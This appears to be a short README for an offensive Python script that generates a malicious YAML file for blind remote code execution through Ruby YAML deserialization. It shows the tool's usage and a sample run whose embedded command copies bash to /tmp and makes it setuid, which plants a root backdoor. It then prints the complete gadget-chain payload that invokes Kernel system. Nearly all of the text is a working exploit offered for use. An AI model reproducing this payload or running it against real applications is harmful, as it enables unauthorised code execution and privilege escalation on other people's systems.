

This script for generate the evil yml file 

resource:
           https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/



Example:

```
usage:  -c <command> -n <filename>
brcetyd.py: error: the following arguments are required: -c/--command, -n/--name
```
```
->$ ./brcetyd.py -n evil.yml -c "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash"

    +-------------------------------+
    |Blind_Remote_Code_Execution    |
    |through YAML Deserialization...|
    +-------------------------------+
    
[+]File Created: evil.yml
[+]Import CMD  : cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
```

```
->$ cat evil.yml 

    ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
          method_id: :resolve
```
